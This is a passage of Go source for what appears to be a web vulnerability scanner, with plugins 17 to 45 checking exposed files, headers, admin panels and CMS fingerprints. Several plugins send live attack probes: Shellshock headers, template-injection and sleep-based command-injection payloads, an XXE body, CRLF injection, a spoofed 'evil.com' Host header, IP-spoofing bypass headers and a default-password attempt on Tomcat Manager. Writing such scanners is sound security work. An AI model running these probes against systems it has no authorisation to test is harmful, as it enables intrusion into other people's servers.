// 17. APACHE STATUS
type ApacheStatusPlugin struct{}

func (p *ApacheStatusPlugin) Name() string { return "Apache Server Status" }
func (p *ApacheStatusPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/server-status"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && strings.Contains(string(body), "Apache Server Status") {
		return &Vulnerability{Target: target, Name: "Apache Status Page", Severity: "LOW", CVSS: 3.0, Description: "Server status is accessible.", Solution: "Disable it.", Reference: ""}
	}
	return nil
}

// 18. DS_STORE
type DSStorePlugin struct{}

func (p *DSStorePlugin) Name() string { return "DS_Store Disclosure" }
func (p *DSStorePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.DS_Store"))
	if err == nil && resp.StatusCode == 200 && resp.ContentLength > 0 {
		resp.Body.Close()
		return &Vulnerability{Target: target, Name: ".DS_Store File", Severity: "LOW", CVSS: 2.5, Description: "Mac file index found.", Solution: "Delete it.", Reference: ""}
	}
	return nil
}

// 19. TRACE METHOD
type TraceMethodPlugin struct{}

func (p *TraceMethodPlugin) Name() string { return "HTTP TRACE Method" }
func (p *TraceMethodPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("TRACE", getURL(target, ""), nil)
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		return &Vulnerability{Target: target, Name: "TRACE Method Enabled", Severity: "MEDIUM", CVSS: 4.5, Description: "Vulnerable to XST attacks.", Solution: "Set TraceEnable Off.", Reference: ""}
	}
	return nil
}

// 20. ENV FILE
type EnvFilePlugin struct{}

func (p *EnvFilePlugin) Name() string { return "ENV File Disclosure" }
func (p *EnvFilePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.env"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && (strings.Contains(string(body), "APP_KEY=") || strings.Contains(string(body), "DB_PASSWORD=")) {
		return &Vulnerability{Target: target, Name: "ENV File Read", Severity: "CRITICAL", CVSS: 10.0, Description: "Passwords/Secrets disclosed.", Solution: "Block access.", Reference: ""}
	}
	return nil
}

// 21. CMS DETECTION (V2 - FINGERPRINT ANALYSIS)
type CMSTestPlugin struct{}

func (p *CMSTestPlugin) Name() string { return "CMS & Technology Analysis" }
func (p *CMSTestPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	content := string(body)

	foundCMS := ""
	if strings.Contains(content, "wp-content") {
		foundCMS = "WordPress"
	}
	if strings.Contains(content, "Joomla") {
		foundCMS = "Joomla"
	}
	if strings.Contains(content, "Drupal") {
		foundCMS = "Drupal"
	}
	if strings.Contains(content, "content=\"Ghost") {
		foundCMS = "Ghost"
	}

	if foundCMS != "" {
		return &Vulnerability{
			Target:      target,
			Name:        "CMS Detection: " + foundCMS,
			Severity:    "INFO",
			CVSS:        0.0,
			Description: fmt.Sprintf("Target site is using %s CMS system.", foundCMS),
			Solution:    "Hide version info and keep it updated.",
		}
	}
	return nil
}

// 22. ADMIN PANEL (V2 - BROAD SCOPE)
type AdminPanelPlugin struct{}

func (p *AdminPanelPlugin) Name() string { return "Admin Panel Finder (Pro)" }
func (p *AdminPanelPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	panels := []string{
		"/admin/", "/administrator/", "/cp/", "/controlpanel/",
		"/wp-admin/", "/vhost/", "/magento/admin/", "/backend/",
		"/directadmin/", "/plesk/", "/cpanel/", "/webmin/",
		"/monitor/", "/manager/html", "/server-manager/",
	}

	for _, p := range panels {
		resp, err := getClient().Get(getURL(target, p))
		if err == nil {
			defer resp.Body.Close()
			// 200 (Open) or 401 (Auth required but panel exists)
			if resp.StatusCode == 200 || resp.StatusCode == 401 {
				return &Vulnerability{
					Target:      target,
					Name:        "Admin Panel Detection",
					Severity:    "MEDIUM",
					CVSS:        5.0,
					Description: "Potential panel found: " + p,
					Solution:    "Restrict public access or use IP whitelisting.",
					Reference:   "",
				}
			}
		}
	}
	return nil
}

// 23. SHELLSHOCK SCANNER - v2
type ShellshockPlugin struct{}

func (p *ShellshockPlugin) Name() string { return "Shellshock Vulnerability" }

func (p *ShellshockPlugin) Run(target ScanTarget) *Vulnerability {
	// Only run on web ports
	if !isWebPort(target.Port) {
		return nil
	}

	// Target URL (CGI scripts are usually under /cgi-bin/)
	// Common targets: /cgi-bin/status, /cgi-bin/test.cgi, /cgi-bin/admin.cgi
	targetURL := getURL(target, "/cgi-bin/status")

	req, _ := http.NewRequest("GET", targetURL, nil)

	randA := 1900
	randB := 52
	expectedResult := "1952" // Result of 1900 + 52

	// Construct the malicious Bash function
	payload := fmt.Sprintf("() { :;}; echo; echo $((%d+%d))", randA, randB)

	// Inject payload into multiple headers to maximize detection chance
	req.Header.Set("User-Agent", payload)
	req.Header.Set("Referer", payload)
	req.Header.Set("X-Api-Version", payload)

	// Send request using the global client
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	bodyStr := string(bodyBytes)

	// VERIFICATION:
	// We only look for the calculated result (1952).
	if strings.Contains(bodyStr, expectedResult) {
		return &Vulnerability{
			Target:      target,
			Name:        "Shellshock (RCE)",
			Severity:    "CRITICAL",
			CVSS:        10.0,
			Description: fmt.Sprintf("Server executed Bash command via HTTP Headers.\nMath Calculation: $((%d+%d)) resulted in '%s'", randA, randB, expectedResult),
			Solution:    "Update Bash immediately (CVE-2014-6271).",
			Reference:   "CVE-2014-6271",
		}
	}

	return nil
}

// 24. LARAVEL DEBUG MODE (Advanced & Verified) v2
type LaravelDebugPlugin struct{}

func (p *LaravelDebugPlugin) Name() string { return "Laravel Debug Mode / Ignition (Verified)" }

func (p *LaravelDebugPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	ignitionURL := getURL(target, "/_ignition/health-check")
	respIgnition, err := client.Get(ignitionURL)

	if err == nil {
		defer respIgnition.Body.Close()
		bodyBytes, _ := io.ReadAll(respIgnition.Body)
		bodyString := string(bodyBytes)

		// Verification: Look for specific JSON keys used by Facade/Ignition.
		// "can_execute_commands": true indicates a high-risk RCE vector.
		if strings.Contains(bodyString, "\"can_execute_commands\"") {
			severity := "HIGH"
			desc := "Laravel Ignition health check exposed. Debug information available."

			if strings.Contains(bodyString, "\"can_execute_commands\":true") || strings.Contains(bodyString, "\"can_execute_commands\": true") {
				severity = "CRITICAL" // This is directly RCE vulnerable
				desc = "Laravel Ignition exposed with command execution enabled (CVE-2021-3129)."
			}

			return &Vulnerability{
				Target:      target,
				Name:        "Laravel Ignition Debug Page",
				Severity:    severity,
				CVSS:        9.8, // Critical if RCE is possible
				Description: desc,
				Solution:    "Disable 'APP_DEBUG' in .env and restrict access to '_ignition' endpoints.",
				Reference:   "CVE-2021-3129",
			}
		}
	}

	errorURL := getURL(target, "/dorm-404-test-"+fmt.Sprintf("%d", time.Now().Unix()))
	respError, err := client.Get(errorURL)

	if err == nil {
		defer respError.Body.Close()
		bodyBytes, _ := io.ReadAll(respError.Body)
		bodyString := string(bodyBytes)

		isIgnition := strings.Contains(bodyString, "window.ignition")
		isSymfonyDump := strings.Contains(bodyString, "sf-dump")
		isFacade := strings.Contains(bodyString, "facade/ignition")

		if isIgnition || (isSymfonyDump && isFacade) {
			return &Vulnerability{
				Target:      target,
				Name:        "Laravel Debug Mode Enabled (Stack Trace)",
				Severity:    "MEDIUM",
				CVSS:        5.3,
				Description: "Application reveals detailed stack traces and environment variables on error pages.",
				Solution:    "Set 'APP_DEBUG=false' in your production environment configuration.",
				Reference:   "OWASP Information Exposure",
			}
		}
	}

	return nil
}

// 25. DOCKER API EXPOSURE
type DockerAPIPlugin struct{}

func (p *DockerAPIPlugin) Name() string { return "Docker API Exposure" }
func (p *DockerAPIPlugin) Run(target ScanTarget) *Vulnerability {
	// Docker usually runs on 2375
	if target.Port != 2375 {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/version"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if strings.Contains(string(body), "Platform") && strings.Contains(string(body), "GoVersion") {
		return &Vulnerability{Target: target, Name: "Docker API Publicly Exposed", Severity: "CRITICAL", CVSS: 10.0, Description: "Unauthorized Docker control possible.", Solution: "Close port to public.", Reference: ""}
	}
	return nil
}

// 26. COOKIE SECURITY FLAGS
type CookieSecPlugin struct{}

func (p *CookieSecPlugin) Name() string { return "Cookie Security" }
func (p *CookieSecPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	for _, cookie := range resp.Cookies() {
		if !cookie.HttpOnly || !cookie.Secure {
			return &Vulnerability{Target: target, Name: "Insecure Cookie", Severity: "LOW", CVSS: 3.0, Description: "HttpOnly or Secure flag missing.", Solution: "Harden cookie settings.", Reference: ""}
		}
	}
	return nil
}

// 27. SECURITY.TXT CHECK
type SecurityTxtPlugin struct{}

func (p *SecurityTxtPlugin) Name() string { return "Security.txt File" }
func (p *SecurityTxtPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.well-known/security.txt"))
	if err == nil && resp.StatusCode == 200 {
		resp.Body.Close()
		return &Vulnerability{Target: target, Name: "Security.txt Found", Severity: "INFO", CVSS: 0.0, Description: "Security contact info available.", Solution: "Informational.", Reference: ""}
	}
	return nil
}

// 28. WEBDAV CHECK
type WebDAVPlugin struct{}

func (p *WebDAVPlugin) Name() string { return "WebDAV Methods" }
func (p *WebDAVPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("OPTIONS", getURL(target, ""), nil)
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	allow := resp.Header.Get("Allow")
	if strings.Contains(allow, "PROPFIND") || strings.Contains(allow, "PUT") || strings.Contains(allow, "DELETE") {
		return &Vulnerability{Target: target, Name: "Dangerous HTTP Methods", Severity: "MEDIUM", CVSS: 6.5, Description: "WebDAV or PUT/DELETE methods enabled.", Solution: "Disable unnecessary HTTP methods.", Reference: ""}
	}
	return nil
}

// 29. EMAIL EXTRACTOR (Simple OSINT)
type EmailExtractPlugin struct{}

func (p *EmailExtractPlugin) Name() string { return "Email Disclosure" }
func (p *EmailExtractPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	content := string(body)

	if strings.Contains(content, "mailto:") {
		return &Vulnerability{Target: target, Name: "Email Address Found", Severity: "INFO", CVSS: 0.0, Description: "Email address found in source (Spam/Phishing risk).", Solution: "-", Reference: ""}
	}
	return nil
}

// 30. S3 BUCKET LEAK
type S3BucketPlugin struct{}

func (p *S3BucketPlugin) Name() string { return "S3 Bucket Detection" }
func (p *S3BucketPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	content := string(body)

	// Does source contain amazonaws link?
	if strings.Contains(content, ".s3.amazonaws.com") {
		return &Vulnerability{Target: target, Name: "S3 Bucket Link", Severity: "LOW", CVSS: 4.0, Description: "Amazon S3 link detected. Check permissions.", Solution: "Disable public access to bucket.", Reference: ""}
	}
	return nil
}

// ==========================================
// NEW ADDITION: DORM v6 MODERN PLUGINS (31-40)
// ==========================================

// 31. CLICKJACKING (X-Frame-Options)
type ClickjackingPlugin struct{}

func (p *ClickjackingPlugin) Name() string { return "Clickjacking Check" }
func (p *ClickjackingPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// FIX: getClient() is called without parameters
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.Header.Get("X-Frame-Options") == "" && resp.Header.Get("Content-Security-Policy") == "" {
		return &Vulnerability{
			Target: target, Name: "Clickjacking Risk", Severity: "LOW", CVSS: 3.0,
			Description: "X-Frame-Options header is missing.",
			Solution:    "Add DENY or SAMEORIGIN directives.",
			Reference:   "OWASP Clickjacking",
		}
	}
	return nil
}

// 32. GRAPHQL INTROSPECTION
type GraphQLPlugin struct{}

func (p *GraphQLPlugin) Name() string { return "GraphQL Schema Disclosure" }
func (p *GraphQLPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	payload := `{"query": "{__schema{types{name}}}"}`
	resp, err := getClient().Post(getURL(target, "/graphql"), "application/json", strings.NewReader(payload))
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "__schema") {
			return &Vulnerability{
				Target: target, Name: "GraphQL Introspection Enabled", Severity: "MEDIUM", CVSS: 5.0,
				Description: "API schema is publicly exposed.",
				Solution:    "Disable introspection in production.",
				Reference:   "GraphQL Security",
			}
		}
	}
	return nil
}

// 33. SWAGGER UI FINDER
type SwaggerPlugin struct{}

func (p *SwaggerPlugin) Name() string { return "Swagger UI Detection" }
func (p *SwaggerPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	paths := []string{"/swagger-ui.html", "/api/docs", "/v2/api-docs", "/docs"}
	for _, path := range paths {
		resp, err := getClient().Get(getURL(target, path))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			return &Vulnerability{
				Target: target, Name: "API Documentation (Swagger)", Severity: "LOW", CVSS: 4.0,
				Description: "API endpoints are exposed: " + path,
				Solution:    "Restrict public access.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 34. HOST HEADER INJECTION
type HostHeaderPlugin struct{}

func (p *HostHeaderPlugin) Name() string { return "Host Header Injection" }
func (p *HostHeaderPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("GET", getURL(target, "/"), nil)
	req.Host = "evil.com"
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	buf := make([]byte, 1024)
	resp.Body.Read(buf)
	if strings.Contains(string(buf), "evil.com") || resp.Header.Get("Location") == "evil.com" {
		return &Vulnerability{
			Target: target, Name: "Host Header Injection", Severity: "MEDIUM", CVSS: 5.4,
			Description: "Host header can be manipulated.",
			Solution:    "Validate the Host header.",
			Reference:   "",
		}
	}
	return nil
}

// 35. PROMETHEUS METRICS
type PrometheusPlugin struct{}

func (p *PrometheusPlugin) Name() string { return "Prometheus Metrics Exposure" }
func (p *PrometheusPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/metrics"))
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		buf := make([]byte, 500)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "go_goroutines") || strings.Contains(string(buf), "process_cpu_seconds") {
			return &Vulnerability{
				Target: target, Name: "System Metrics Exposure", Severity: "MEDIUM", CVSS: 5.0,
				Description: "/metrics endpoint is open.",
				Solution:    "Restrict access.",
				Reference:   "",
			}
		}
	}
	return nil
}

// 36. SSTI (V2.1 - SMART GUESSING)
type SSTIPlugin struct{}

func (p *SSTIPlugin) Name() string { return "SSTI (Template Injection - Smart)" }

func (p *SSTIPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	baseURL := getURL(target, "")

	// Matematik işlemi: 1337 * 1337 = 1787569
	const expectedResult = "1787569"

	endpoints := []string{"/", "/index.php", "/home", "/search", "/error"}
	params := []string{"q", "s", "search", "name", "username", "id", "template", "msg"}

	payloads := []string{
		"{{1337*1337}}",    // Jinja2 / Twig
		"${1337*1337}",     // Smarty
		"#{1337*1337}",     // Velocity
		"<%= 1337*1337 %>", // ERB
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range payloads {
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))

				resp, err := client.Get(targetURL)
				if err == nil {
					defer resp.Body.Close()
					buf := make([]byte, 4096)
					n, _ := resp.Body.Read(buf)
					body := string(buf[:n])

					// Eğer sonuç (1787569) sayfada varsa VE bizim ham payload yoksa (reflection değilse)
					if strings.Contains(body, expectedResult) && !strings.Contains(body, payload) {
						return &Vulnerability{
							Target:      target,
							Name:        "Server Side Template Injection (SSTI)",
							Severity:    "CRITICAL",
							CVSS:        9.9,
							Description: fmt.Sprintf("Template engine executed code.\nURL: %s\nPayload: %s\nResult: %s", targetURL, payload, expectedResult),
							Solution:    "Sanitize inputs before passing to template engine.",
							Reference:   "OWASP SSTI",
						}
					}
				}
			}
		}
	}
	return nil
}

// 37. HSTS CHECK
type HSTSPlugin struct{}

func (p *HSTSPlugin) Name() string { return "HSTS (HTTPS Enforcement)" }
func (p *HSTSPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 443 {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.Header.Get("Strict-Transport-Security") == "" {
		return &Vulnerability{Target: target, Name: "HSTS Missing", Severity: "LOW", CVSS: 2.0, Description: "Strict-Transport-Security header is missing.", Solution: "Enable HSTS.", Reference: ""}
	}
	return nil
}

// 38. TOMCAT MANAGER (Fingerprinting & Default Creds) - v2
type TomcatManagerPlugin struct{}

func (p *TomcatManagerPlugin) Name() string { return "Tomcat Manager Panel (Verified)" }

func (p *TomcatManagerPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	targetPath := "/manager/html"
	fullURL := getURL(target, targetPath)

	// Step 1: Initial Probe (Check for existence)
	req, _ := http.NewRequest("GET", fullURL, nil)
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		// Verification Logic 1: Fingerprint the Realm
		// Tomcat usually sends: WWW-Authenticate: Basic realm="Tomcat Manager Application"
		authHeader := resp.Header.Get("WWW-Authenticate")
		isTomcat := strings.Contains(authHeader, "Tomcat Manager") || strings.Contains(authHeader, "Tomcat")

		// Also check body content if status is 200 (Unprotected)
		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyString := string(bodyBytes)
		isUnprotected := resp.StatusCode == 200 && strings.Contains(bodyString, "Tomcat Web Application Manager")

		if isUnprotected {
			// OPEN ACCESS -> CRITICAL
			return &Vulnerability{
				Target:      target,
				Name:        "Tomcat Manager (Unauthenticated)",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: "Tomcat Manager panel is accessible without authentication.",
				Solution:    "Enable authentication or restrict access by IP.",
				Reference:   "OWASP Misconfiguration",
			}
		}

		if resp.StatusCode == 401 && isTomcat {

			creds := []struct {
				User string
				Pass string
			}{
				{"tomcat", "s3cret"},
				{"admin", "admin"},
				{"manager", "manager"},
			}

			for _, cred := range creds {
				reqAuth, _ := http.NewRequest("GET", fullURL, nil)
				reqAuth.SetBasicAuth(cred.User, cred.Pass)

				respAuth, errAuth := client.Do(reqAuth)
				if errAuth == nil {
					respAuth.Body.Close()
					// If we get 200 OK after auth, we hacked it.
					if respAuth.StatusCode == 200 {
						return &Vulnerability{
							Target:      target,
							Name:        "Tomcat Manager (Default Credentials)",
							Severity:    "CRITICAL",
							CVSS:        9.8, // RCE is guaranteed via WAR upload
							Description: fmt.Sprintf("Access gained using default credentials.\nUser: %s\nPass: %s", cred.User, cred.Pass),
							Solution:    "Change default passwords in tomcat-users.xml immediately.",
							Reference:   "CVE-1999-0508", // Generic Default Creds
						}
					}
				}
			}

			// If brute force fails but panel is exposed:
			return &Vulnerability{
				Target:      target,
				Name:        "Tomcat Manager Panel Exposed",
				Severity:    "HIGH",
				CVSS:        7.5,
				Description: "Tomcat Manager login panel is exposed to the internet.",
				Solution:    "Restrict access to the /manager endpoint via firewall/IP whitelisting.",
				Reference:   "OWASP Security Misconfiguration",
			}
		}
	}
	return nil
}

// 39. SENSITIVE CONFIGS
type SensitiveConfigPlugin struct{}

func (p *SensitiveConfigPlugin) Name() string { return "Editor/Config File Disclosure" }
func (p *SensitiveConfigPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	files := []string{"/.vscode/sftp.json", "/.idea/workspace.xml", "/.git/config"}
	for _, f := range files {
		resp, err := getClient().Get(getURL(target, f))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			return &Vulnerability{Target: target, Name: "Sensitive Config File", Severity: "MEDIUM", CVSS: 5.0, Description: "File found: " + f, Solution: "Block access.", Reference: ""}
		}
	}
	return nil
}

// 40. PYTHON SERVER CHECK
type PythonServerPlugin struct{}

func (p *PythonServerPlugin) Name() string { return "Open Directory Listing" }
func (p *PythonServerPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/"))
	if err == nil && resp.StatusCode == 200 {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		if strings.Contains(string(buf), "Directory listing for") {
			return &Vulnerability{
				Target: target, Name: "Directory Listing Enabled", Severity: "MEDIUM", CVSS: 5.0,
				Description: "Folder contents are visible to everyone.",
				Solution:    "Disable indexing.",
				Reference:   "",
			}
		}
	}
	return nil
}

// ==========================================
// DORM v7: HARDENED / PRO WEAPONS (41-50)
// ==========================================

// 41. BLIND RCE (V2.1 - SMART GUESSING)
type BlindRCEPlugin struct{}

func (p *BlindRCEPlugin) Name() string { return "Blind Command Injection (Smart)" }

func (p *BlindRCEPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	baseURL := getURL(target, "")

	// Komut çalıştırılabilecek tehlikeli yerler
	endpoints := []string{"/", "/ping.php", "/status.php", "/check.php", "/test.php", "/admin.php"}
	params := []string{"cmd", "ip", "host", "addr", "query", "file", "download", "path"}

	sleepSeconds := 5
	// Linux & Windows payloads
	payloads := []string{
		fmt.Sprintf("$(sleep %d)", sleepSeconds),
		fmt.Sprintf("%%26sleep+%d", sleepSeconds), // &sleep 5
		fmt.Sprintf("|sleep %d", sleepSeconds),
		fmt.Sprintf(";sleep %d", sleepSeconds),
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range payloads {
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, payload)

				start := time.Now()
				resp, err := client.Get(targetURL)
				duration := time.Since(start)

				if err == nil {
					resp.Body.Close()
				}

				// Eğer sunucu bizim istediğimiz kadar (5sn) uyuduysa, içeride komut çalıştı demektir.
				if duration.Seconds() >= float64(sleepSeconds) {
					return &Vulnerability{
						Target:      target,
						Name:        "Blind OS Command Injection",
						Severity:    "CRITICAL",
						CVSS:        9.8,
						Description: fmt.Sprintf("Server executed system command via time-delay.\nURL: %s\nPayload: %s\nDelay: %v", targetURL, payload, duration),
						Solution:    "Disable system command execution functions (exec, system, passthru).",
						Reference:   "OWASP Command Injection",
					}
				}
			}
		}
	}
	return nil
}

// 42. XXE INJECTION (XML External Entity)
type XXEPlugin struct{}

func (p *XXEPlugin) Name() string { return "XXE Injection" }
func (p *XXEPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Sending a simple XML payload
	payload := `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe "DORM_XXE_TEST">]><foo>&xxe;</foo>`
	resp, err := getClient().Post(getURL(target, "/xml"), "application/xml", strings.NewReader(payload))
	if err == nil {
		defer resp.Body.Close()
		buf := make([]byte, 1024)
		resp.Body.Read(buf)
		// If server parses entity and returns "DORM_XXE_TEST", it's vulnerable.
		if strings.Contains(string(buf), "DORM_XXE_TEST") {
			return &Vulnerability{
				Target: target, Name: "XML External Entity (XXE)", Severity: "HIGH", CVSS: 8.2,
				Description: "XML parsing can be manipulated.",
				Solution:    "Disable external entities in XML parser.",
				Reference:   "OWASP XXE",
			}
		}
	}
	return nil
}

// 43. ADMIN IP BYPASS (Header Spoofing & Verified) - v2
type AdminBypassPlugin struct{}

func (p *AdminBypassPlugin) Name() string { return "Admin Panel Bypass (IP Spoof - Verified)" }

func (p *AdminBypassPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	targetPath := "/admin" // Can be adjusted to /console, /dashboard etc.
	fullURL := getURL(target, targetPath)

	// 1. BASELINE CHECK
	reqBase, _ := http.NewRequest("GET", fullURL, nil)
	respBase, err := client.Do(reqBase)
	if err != nil {
		return nil
	}
	baseStatus := respBase.StatusCode
	respBase.Body.Close()

	// If already accessible (200) or not found (404), skip bypass attempt.
	// We only target Forbidden (403) or Unauthorized (401) pages.
	if baseStatus != 403 && baseStatus != 401 {
		return nil
	}

	headers := []string{
		"X-Forwarded-For",
		"X-Real-IP",
		"Client-IP",
		"X-Originating-IP",
		"X-Remote-IP",
		"X-Remote-Addr",
		"X-Client-IP",
		"X-Host",
		"X-Forwarded-Host",
	}

	spoofIPs := []string{
		"127.0.0.1",
		"localhost",
		"0.0.0.0",
		"192.168.1.1",
		"10.0.0.1",
		"::1", // IPv6 Localhost
	}

	for _, header := range headers {
		for _, ip := range spoofIPs {
			reqSpoof, _ := http.NewRequest("GET", fullURL, nil)
			reqSpoof.Header.Set(header, ip)

			respSpoof, err := client.Do(reqSpoof)
			if err == nil {
				spoofStatus := respSpoof.StatusCode
				respSpoof.Body.Close()

				// CRITICAL: If status changes from Forbidden (403) to OK (200)
				if spoofStatus == 200 {
					return &Vulnerability{
						Target:   target,
						Name:     "Admin IP Restriction Bypass",
						Severity: "CRITICAL",
						CVSS:     9.8,
						Description: fmt.Sprintf(
							"Access restriction bypassed!\nBaseline Status: %d\nBypass Status: %d\nEffective Header: %s: %s",
							baseStatus, spoofStatus, header, ip),
						Solution:  "Do not rely solely on client-side headers (e.g., X-Forwarded-For) for access control/authentication.",
						Reference: "CWE-290: Authentication Bypass by Spoofing",
					}
				}
			}
		}
	}

	return nil
}

// 44. CRLF INJECTION (HTTP Response Splitting)
type CRLFPlugin struct{}

func (p *CRLFPlugin) Name() string { return "CRLF Injection" }
func (p *CRLFPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	// Try adding a fake cookie via line break characters (%0d%0a)
	payload := "/%0d%0aSet-Cookie:DORM=Hacked"
	resp, err := getClient().Get(getURL(target, payload))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	// If server accepts our fake cookie and writes it to Header
	if strings.Contains(resp.Header.Get("Set-Cookie"), "DORM=Hacked") {
		return &Vulnerability{
			Target: target, Name: "CRLF Injection / Response Splitting", Severity: "MEDIUM", CVSS: 6.5,
			Description: "HTTP response can be split.",
			Solution:    "Encode URL inputs.",
			Reference:   "",
		}
	}
	return nil
}

// 45. DANGEROUS HTTP METHODS - v2
type DangerousMethodsPlugin struct{}

func (p *DangerousMethodsPlugin) Name() string { return "Dangerous HTTP Methods" }

func (p *DangerousMethodsPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// 1. OPTIONS CHECK (PASSIVE)
	// Check what methods the server CLAIMS to support.
	reqOptions, _ := http.NewRequest("OPTIONS", getURL(target, "/"), nil)
	respOptions, err := getClient().Do(reqOptions)
	if err == nil {
		defer respOptions.Body.Close()
		allowHeader := respOptions.Header.Get("Allow")

		// TRACE is dangerous (XST attacks), verify it explicitly.
		if strings.Contains(allowHeader, "TRACE") {
			return &Vulnerability{
				Target:      target,
				Name:        "Dangerous Method (TRACE)",
				Severity:    "MEDIUM",
				CVSS:        5.0,
				Description: "The server supports the TRACE method, which can lead to Cross-Site Tracing (XST) attacks.",
				Solution:    "Disable the TRACE method in web server configuration.",
				Reference:   "OWASP XST",
			}
		}
	}

	// 2. PUT METHOD VERIFICATION (ACTIVE)
	// Instead of just checking status code, we try to Upload -> Verify -> Delete.

	// Generate a random filename and unique content to avoid collisions and false positives.
	randomID := fmt.Sprintf("%d", time.Now().UnixNano())
	testFileName := fmt.Sprintf("/dorm_test_%s.txt", randomID)
	testContent := fmt.Sprintf("DORM_SECURITY_CHECK_%s", randomID)

	// A) Try to UPLOAD (PUT)
	reqPut, _ := http.NewRequest("PUT", getURL(target, testFileName), strings.NewReader(testContent))
	reqPut.Header.Set("Content-Type", "text/plain")

	respPut, err := getClient().Do(reqPut)
	if err != nil {
		return nil
	}
	respPut.Body.Close()

	// If server says "Created" (201) or "OK" (200), we must VERIFY.
	// Many servers return 200 but ignore the upload (Soft Success).
	if respPut.StatusCode == 201 || respPut.StatusCode == 200 {

		// B) Try to READ back (GET)
